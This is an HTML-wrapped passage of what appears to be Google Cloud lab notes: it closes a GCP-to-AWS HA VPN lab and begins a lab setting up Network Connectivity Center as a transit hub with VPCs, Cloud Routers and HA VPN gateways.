<span>       --format=&#39;flattened(status,detailedStatus)&#39;</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">You should receive a status of **ESTABLISHED**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Verify the configuration</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Congratulations!</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">You have successfully created highly available VPN connections between Google Cloud and Amazon Web Services.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">### LAB - Configuring Network Connectivity Center as a Transit Hub</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Overview</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Network Connectivity Center (NCC) enables connecting different enterprise networks together that are outside of Google Cloud by leveraging Google's network—providing enterprises instant access to planet-scale reach and high reliability. Traffic between non-Google networks is referred to as data transfer traffic, which can occur using existing standard cloud network connectivity resources such as Cloud VPN, Dedicated or Partner Interconnect.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">In this lab, you will go through the process of setting up NCC as a transit hub to route traffic between two non-Google networks using Google's backbone network.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Architecture</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NCC consists of hub and spoke resources.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Hub**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">A hub is a global Google Cloud resource that supports multiple attached spokes. It provides a simple way to connect spokes together to enable data transfer across them. A hub can provide data transfer between different on-premises locations and a Virtual Private Cloud (VPC) network through its attached spokes.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Spoke**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">A spoke is a Google Cloud network resource connected to a hub. It is part of the hub, and can't be created without creating the hub first. A spoke routes traffic to remote network address blocks and enables the connection of multiple remote networks.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Spokes can be of one of the following types:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- HA VPN tunnels</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- VLAN attachments</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Router appliance instances that you or select partners deploy within Google Cloud</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The following network topology is similar to a typical customer deployment having branch offices located in two geographically separate locations. For this lab, you are simulating two VPCs *vpc-a*, and *vpc-b* in `Region 1`, and `Region 2` as the branch offices respectively.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">The branch offices are connected to a VPC, *vpc-transit*, which is a central hub terminating a pair of HA VPNs. These VPNs are configured in a region closest to the branch offices. In the real world, these VPNs could be replaced using Interconnects.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">You will configure the NCC hub in the *vpc-transit* network, and the two remote branch offices will be connected using the HA VPN tunnels as spokes.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![Network topology project example](images/9k3iu618o9ppsU1nO%2FJRRX17rCFJCu%2BMp33J%2FtJ1C9o%3D.png)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">In this lab, you will achieve the following objectives:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Create a hub VPC called *vpc-transit*.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Create two remote branch office VPCs namely *vpc-a* and *vpc-b*.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Create HA VPN from *vpa-a* to *vpc-transit*, and *vpc-b* to *vpc-transit*.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Create a NCC hub resource and attach the HA VPNs as spokes.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Test the setup end to end deploying VMs in the remote branch office VPCs.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Prerequisites</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- Basic knowledge of Google VPC Networking, and Compute Engine.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">- It is helpful to have completed the [Networking 101](https://google.qwiklabs.com/catalog_lab/311) and [VPC Networking: Cloud HA-VPN](https://www.qwiklabs.com/focuses/6270?parent=catalog) labs.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 1. Create vpc-transit</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the Google Cloud Console, in the top-right toolbar, click the **Activate Cloud Shell** button and run the following command to delete the **default** network.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![Cloud Shell icon](images/vdY5e%2Fan9ZGXw5a%2FZMb1agpXhRGozsOadHURcR8thAQ%3D.png)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 1935px;"></div><div class="CodeMirror-gutters" style="display: none; height: 1935px;"></div></div></div></pre><p><span>gcloud compute networks delete default</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.96875px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the Google Cloud Console, from the **Navigation Menu (![Navigation menu icon](https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D))**, go to **VPC network**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **CREATE VPC NETWORK**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Enter a Name for the network: **vpc-transit**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. You do not need to create a subnet for the *vpc-transit* so click **Delete** next to New Subnet.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Choose the Dynamic routing mode for the VPC network as **Global**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Note:** Learn more about dynamic routing from the [dynamic routing mode documentation](https://cloud.google.com/vpc/docs/vpc#routing_for_hybrid_networks).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. Click **Create**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Click *Check my progress* to verify the objective.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create vpc-transit network</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 2. Create remote branch office VPCs</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the Google Cloud Console, from the **Navigation menu**, go to the **VPC network**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **CREATE VPC NETWORK**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Enter a Name for the network as **vpc-a**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Choose **Custom** for the Subnet creation mode.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. In the New subnet section, specify the following configuration parameters for a subnet:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Name for the subnet: **vpc-a-sub1-use4**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - Region: **`Region 1`**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; - IP address range **10.20.10.0/24**. This is the primary IP range for the subnet.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7. Choose the Dynamic routing mode for the VPC network as **Regional**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8. Click **Create**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">9. To add the second remote branch office VPC, click **CREATE VPC NETWORK**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">10. Enter a Name for the network as **vpc-b**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">11. Choose **Custom** for the Subnet creation mode.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">12. In the New subnet section, specify the following configuration parameters for a subnet:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">13. Provide a Name for the subnet as **vpc-b-sub1-usw2**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">14. Select Region as **`Region 2`**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">15. Enter an IP address range **10.20.20.0/24**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">16. Click **Done**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">17. Choose the Dynamic routing mode for the VPC network as **Regional**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">18. Click **Create**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Now you should be able to view all 3 VPCs in the VPC networks console like this:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">![VPC networks console displaying VPCs](images/Pb5gdQp%2B93LD4uC3K0KTB6v1mhwNz5Rst6YH1k5UTzc%3D.png)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Click *Check my progress* to verify the objective.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create remote branch office VPCs namely vpc-a and vpc-b</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Check my progress</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">#### Task 3. Configure HA VPN between the remote branch office VPCs and the transit hub VPC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Note:** In this lab you are simulating the remote branch offices as Google Cloud VPCs, therefore using the steps listed to [Create HA VPN between Google Cloud Networks](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn2).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">For any practical implementation, you may replace the steps listed below with the steps for [Creating an HA VPN gateway to a peer VPN gateway](https://cloud.google.com/network-connectivity/docs/vpn/how-to/creating-ha-vpn) if you are using HA VPNs to connect to your branch offices.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">In this section you will configure an HA VPN between the remote branch office VPCs (*vpc-a* and *vpc-b*) and the transit hub VPC (*vpc-transit*). HA VPN uses BGP for dynamically exchanging routes between Google Cloud and the peer network. Before configuring the HA VPNs, you need to create Cloud Routers associated with each VPC network.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Note:** Learn more about Cloud Routers [in the Cloud Router overview documentation](https://cloud.google.com/network-connectivity/docs/router/concepts/overview).</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">##### **Step 1: Create cloud routers**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To create a new Cloud Router for each VPC, specify the following:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. In the Cloud Console, from the **Navigation menu**, go to **Network Connectivity** and select **Cloud Routers**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Create router**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Enter name as **cr-vpc-transit-use4-1**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Select the network as **vpc-transit**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Select the region as **`Region 1`**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6. Enter the **ASN** as **65000**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7. Select **Advertise all subnets visible to the Cloud Router (Default)**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8. Click **Create**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">9. Use the steps mentioned above to create additional cloud routers using the following details:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| **Cloud Router name** &nbsp; | **VPC Network** | **Region** | **Google ASN** |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| ----------------------- | --------------- | ---------- | -------------- |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *cr-vpc-transit-usw2-1* | vpc-transit &nbsp; &nbsp; | `Region 2` | 65000 &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *cr-vpc-a-use4-1* &nbsp; &nbsp; &nbsp; | vpc-a &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | `Region 1` | 65001 &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">| *cr-vpc-b-usw2-1* &nbsp; &nbsp; &nbsp; | vpc-b &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; | `Region 2` | 65002 &nbsp; &nbsp; &nbsp; &nbsp;  |</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">##### **Step 2: Create HA VPN gateways**</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Create an HA VPN gateway in the *vpc-transit* network for `Region 1` region, using the following steps:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">1. From the **Navigation menu**, go to **Network Connectivity** and select **VPN**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">2. Click **Create VPN connection**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">3. Select **High-availability (HA) VPN**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">4. Click **Continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">5. Specify a VPN gateway name as **vpc-transit-gw1-use4**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">6. Under the VPC network, select **vpc-transit**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">7. Select a Region as **`Region 1`**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">8. Click **Create and continue**.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">**Note:** Before adding VPN tunnels, you need to create additional VPN gateways.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
